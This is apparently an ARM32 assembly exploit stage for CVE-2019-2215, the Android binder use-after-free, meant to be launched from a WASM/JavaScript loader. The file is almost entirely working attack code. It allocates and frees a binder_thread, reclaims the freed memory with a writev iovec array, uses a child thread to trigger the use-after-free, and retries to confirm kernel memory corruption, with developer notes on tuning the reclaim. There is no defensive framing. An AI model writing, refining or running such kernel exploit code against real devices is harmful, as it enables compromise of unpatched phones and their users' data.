/*
 * uaf_iovec_leak.s — v20s: NO SPRAY, per-attempt diagnostics
 * ARM32 EABI shellcode for CVE-2019-2215
 *
 * THEORY (v20m-v20r: 0% reclaim across 40+ attempts):
 *   Inner spray (8×binder open+ioctl) and bulk spray (32×) may be
 *   COUNTERPRODUCTIVE. They fill c->page with kzalloc(408) objects,
 *   potentially pushing the epoll_ctl's binder_thread to a new slab page.
 *   Meanwhile, writev's kmalloc(512) might target a different page.
 *
 * FIX (v20s):
 *   1. REMOVE ALL SPRAY — let the natural slab state handle reclaim.
 *      The kfree goes to c->freelist, next kmalloc pops it (LIFO).
 *   2. Store each attempt's writev_ret at +0x1500 for per-attempt analysis.
 *   3. MAX_ATTEMPTS = 32 (proven safe: ~16s runtime).
 *   4. JavaScript auto-reloads up to 5x if 0xFExx (160 total attempts).
 *
 * Flow:
 *   A0:     sched_setaffinity → pin to CPUs 1-3 (mask 0x0E)
 *   A_IOV:  Setup 32 compat iovecs + markers (ONCE)
 *
 *   RETRY (up to 32 attempts):
 *     epoll_create1 → R8
 *     pipe2 → R5, R6 + fill pipe (64KB)
 *     openat("/dev/binder") → R4
 *     clone child (sleeps 30ms, closes epoll, drains)
 *     ── CRITICAL SECTION ──
 *     epoll_ctl(ADD, binder_fd)       ← ALLOC binder_thread
 *     ioctl(BINDER_THREAD_EXIT)       ← FREE
 *     writev(pipe_wr, 32 iovecs)      ← RECLAIM + BLOCK
 *     ── END CRITICAL ──
 *     Wait 20ms, drain, check writev result
 *     Store writev_ret at +0x1500[attempt]
 *     Close pipe_rd, binder_fd, epoll_fd
 *
 * WASM memory layout:
 *   +0x0000: shellcode (~960 bytes)
 *   +0x0800: parent buffer (2KB)
 *   +0x1000: 32 compat iovecs (256 bytes)
 *   +0x1100: iovec data buffers (32 bytes)
 *   +0x1400: results area
 *     +0x1400: writev_ret (last attempt)
 *     +0x1404: total_read
 *     +0x1408: sched_setaffinity return
 *     +0x140C: attempt count
 *     +0x1410: d0-d3
 *   +0x1500: per-attempt writev_ret array (32 × 4 = 128 bytes)
 *   +0xD000: child drain buffer (2KB)
 *   +0xE000: child stack (4KB, grows down from +0xF000)
 *
 * Return codes:
 *   0xCC00 | (31-writev_ret) = UAF CONFIRMED!
 *   0xFE00 | attempt_count   = no corruption after N attempts (0xFE20 = 32)
 *   0xA1xx = openat fail, 0xA3xx = epoll_create1 fail
 *   0xA4xx = epoll_ctl fail, 0xA5xx = pipe2 fail
 *   0xB1xx = clone failed
 */

    .syntax unified
    .arch armv7-a
    .text
    .align 2
    .globl _start
    .type _start, %function

.equ BINDER_THREAD_EXIT,     0x40046208
.equ EPOLL_CTL_ADD,          1
.equ EPOLLIN,                0x001
.equ O_RDWR,                 2
.equ CLONE_FLAGS, 0x511
.equ MAX_ATTEMPTS, 32

.equ FRAME, 48

_start:
    push    {r4-r11, lr}
    sub     sp, sp, #FRAME
    mov     r10, r4             /* R10 = wasm_mem base */

    /* ═══ A0: sched_setaffinity — pin to CPUs 1-3 ═══ */
    mov     r3, #0x0E           /* CPUs 1,2,3 mask */
    str     r3, [sp, #0]
    mov     r0, #0
    mov     r1, #4
    add     r2, sp, #0
    mov     r7, #241            /* __NR_sched_setaffinity */
    svc     #0
    add     r1, r10, #0x1400
    str     r0, [r1, #8]        /* +0x1408 = sched result */

    /* ═══ A_IOV: Setup 32 compat iovecs at +0x1000 (ONCE) ═══
     * iovec[10] = {0, 0} — null sentinel at native offset 0xA0.
     * All others = {scratch+i, 1} — 1-byte markers. */
    add     r0, r10, #0x1000
    mov     r3, #0
iov_setup:
    cmp     r3, #10
    bne     iov_not10
    mov     r1, #0
    str     r1, [r0], #4
    str     r1, [r0], #4
    add     r3, r3, #1
    b       iov_check
iov_not10:
    add     r1, r10, #0x1100
    add     r1, r1, r3
    str     r1, [r0], #4
    mov     r2, #1
    str     r2, [r0], #4
    add     r3, r3, #1
iov_check:
    cmp     r3, #32
    blt     iov_setup

    /* Marker bytes 'A'..'`' */
    add     r0, r10, #0x1100
    mov     r1, #0x41
    mov     r2, #32
marker_fill:
    strb    r1, [r0], #1
    add     r1, r1, #1
    subs    r2, r2, #1
    bgt     marker_fill

    /* Save binder path */
    adr     r3, str_binder
    str     r3, [sp, #24]
    b       after_binder_str

    .align  2
str_binder:
    .asciz  "/dev/binder"
    .align  2
after_binder_str:

    /* ═══ NO BULK SPRAY — test natural slab reclaim ═══ */

    /* ═══ RETRY LOOP (up to 32 attempts) ═══ */
    mov     r11, #0

retry_loop:
    add     r0, r10, #0x1400
    str     r11, [r0, #12]      /* +0x140C = attempt count */

    /* epoll_create1(0) */
    mov     r0, #0
    mov     r7, #352
    add     r7, r7, #5          /* 357 */
    svc     #0
    cmp     r0, #0
    bmi     fail_a3
    mov     r8, r0              /* R8 = epoll_fd */

    /* pipe2 */
    add     r0, sp, #16
    mov     r1, #0
    mov     r7, #352
    add     r7, r7, #7          /* 359 */
    svc     #0
    cmp     r0, #0
    bmi     fail_a5
    ldr     r5, [sp, #16]       /* R5 = pipe_rd */
    ldr     r6, [sp, #20]       /* R6 = pipe_wr */

    /* Fill pipe 64KB (32 × 2KB) */
    mov     r9, #32
fill_loop:
    mov     r0, r6
    add     r1, r10, #0x0800
    mov     r2, #0x0800
    mov     r7, #4              /* __NR_write */
    svc     #0
    cmp     r0, #0
    ble     fill_done
    subs    r9, r9, #1
    bgt     fill_loop
fill_done:

    /* openat("/dev/binder") */
    mvn     r0, #99
    ldr     r1, [sp, #24]
    mov     r2, #O_RDWR
    mov     r3, #0
    mov     r7, #320
    add     r7, r7, #2          /* 322 */
    svc     #0
    cmp     r0, #0
    bmi     fail_a1
    mov     r4, r0              /* R4 = binder_fd */

    /* clone(CLONE_VM|CLONE_FILES|SIGCHLD) */
    ldr     r0, const_cflags
    add     r1, r10, #0xF000    /* child stack top */
    mov     r2, #0
    mov     r3, #0
    mov     r7, #120            /* __NR_clone */
    svc     #0
    cmp     r0, #0
    bmi     fail_b1
    beq     child_thread

    /* ════════════════════════════════════════════════════════
     * CRITICAL SECTION — ZERO spray means c->page is whatever
     * the system has naturally. kfree goes to c->freelist.
     * Immediate kmalloc should pop it (LIFO).
     * ════════════════════════════════════════════════════════ */

    /* epoll_ctl(ADD, binder_fd) — ALLOC binder_thread */
    mov     r3, #EPOLLIN
    str     r3, [sp, #4]
    str     r4, [sp, #8]
    mov     r3, #0
    str     r3, [sp, #12]
    mov     r0, r8
    mov     r1, #EPOLL_CTL_ADD
    mov     r2, r4
    add     r3, sp, #4
    mov     r7, #248
    add     r7, r7, #3          /* 251 = __NR_epoll_ctl */
    svc     #0
    cmp     r0, #0
    bmi     fail_a4

    /* BINDER_THREAD_EXIT — FREE */
    mov     r0, r4
    ldr     r1, const_bte
    mov     r2, #0
    mov     r7, #54
    svc     #0

    /* writev — RECLAIM + BLOCK */
    mov     r0, r6              /* pipe_wr */
    add     r1, r10, #0x1000    /* compat iovec array */
    mov     r2, #32             /* 32 iovecs → kmalloc(32×16=512) */
    mov     r7, #146            /* __NR_writev */
    svc     #0
    mov     r9, r0              /* R9 = writev return */

    /* ═══ END CRITICAL SECTION ═══ */

    /* Store writev_ret at +0x1400 (last) and +0x1500[attempt] */
    add     r0, r10, #0x1400
    str     r9, [r0, #0]
    add     r0, r10, #0x1500
    str     r9, [r0, r11, lsl #2]  /* per-attempt writev_ret */

    /* nanosleep(20ms) */
    mov     r3, #0
    str     r3, [sp, #28]
    ldr     r3, const_20ms
    str     r3, [sp, #32]
    add     r0, sp, #28
    mov     r1, #0
    mov     r7, #162            /* __NR_nanosleep */
    svc     #0

    /* close(pipe_wr) */
    mov     r0, r6
    mov     r7, #6
    svc     #0

    /* Parent drain */
    mov     r3, #0
    str     r3, [sp, #40]
parent_drain:
    mov     r0, r5
    add     r1, r10, #0x0800
    mov     r2, #0x0800
    mov     r7, #3              /* __NR_read */
    svc     #0
    cmp     r0, #0
    ble     parent_drain_done
    ldr     r3, [sp, #40]
    add     r3, r3, r0
    str     r3, [sp, #40]
    cmp     r3, #0x20000
    blt     parent_drain
parent_drain_done:

    /* Store results + d0-d3 */
    add     r0, r10, #0x1400
    ldr     r3, [sp, #40]
    str     r3, [r0, #4]        /* +0x1404 = total_remaining */
    add     r1, r10, #0x0800
    ldr     r3, [r1, #0]
    str     r3, [r0, #16]       /* d0 */
    ldr     r3, [r1, #4]
    str     r3, [r0, #20]       /* d1 */
    ldr     r3, [r1, #8]
    str     r3, [r0, #24]       /* d2 */
    ldr     r3, [r1, #12]
    str     r3, [r0, #28]       /* d3 */

    /* Close pipe_rd, binder_fd, epoll_fd */
    mov     r0, r5
    mov     r7, #6
    svc     #0
    mov     r0, r4
    mov     r7, #6
    svc     #0
    mov     r0, r8
    mov     r7, #6
    svc     #0

    /* Check writev_ret */
    cmp     r9, #31
    bne     corruption_detected

    /* No corruption — retry? */
    add     r11, r11, #1
    cmp     r11, #MAX_ATTEMPTS
    blt     retry_loop

    /* All attempts failed */
    mov     r0, #0xFE00
    orr     r0, r0, r11
    b       done

corruption_detected:
    mov     r3, #31
    sub     r3, r3, r9
    and     r3, r3, #0xFF
    mov     r0, #0xCC00
    orr     r0, r0, r3
    b       done

    /* ═════════════════════════════════
     * CHILD THREAD
     * ═════════════════════════════════ */
child_thread:
    sub     sp, sp, #16

    /* nanosleep(30ms) */
    mov     r3, #0
    str     r3, [sp, #0]
    ldr     r3, const_30ms
    str     r3, [sp, #4]
    add     r0, sp, #0
    mov     r1, #0
    mov     r7, #162
    svc     #0

    /* close(epoll_fd) — UAF TRIGGER */
    mov     r0, r8
    mov     r7, #6
    svc     #0

    /* nanosleep(5ms) */
    mov     r3, #0
    str     r3, [sp, #0]
    ldr     r3, const_5ms
    str     r3, [sp, #4]
    add     r0, sp, #0
    mov     r1, #0
    mov     r7, #162
    svc     #0

    /* Drain pipe to unblock parent's writev */
child_drain:
    mov     r0, r5
    add     r1, r10, #0xD000
    mov     r2, #0x0800
    mov     r7, #3
    svc     #0
    cmp     r0, #0
    bgt     child_drain

    /* _exit(0) */
    mov     r0, #0
    mov     r7, #1
    svc     #0

    /* ═══ Error handlers ═══ */
fail_a1:
    rsb     r0, r0, #0
    mov     r1, #0xA100
    orr     r0, r0, r1
    b       done
fail_a3:
    rsb     r0, r0, #0
    mov     r1, #0xA300
    orr     r0, r0, r1
    b       done
fail_a4:
    rsb     r0, r0, #0
    mov     r1, #0xA400
    orr     r0, r0, r1
    b       done
fail_a5:
    rsb     r0, r0, #0
    mov     r1, #0xA500
    orr     r0, r0, r1
    b       done
fail_b1:
    rsb     r0, r0, #0
    mov     r1, #0xB100
    orr     r0, r0, r1
    b       done

done:
    add     sp, sp, #FRAME
    pop     {r4-r11, pc}

    /* ═══ Data pool ═══ */
    .align 2
const_bte:
    .word   0x40046208          /* BINDER_THREAD_EXIT */
const_cflags:
    .word   0x00000511          /* CLONE_VM|CLONE_FILES|SIGCHLD */
const_30ms:
    .word   30000000
const_20ms:
    .word   20000000
const_5ms:
    .word   5000000
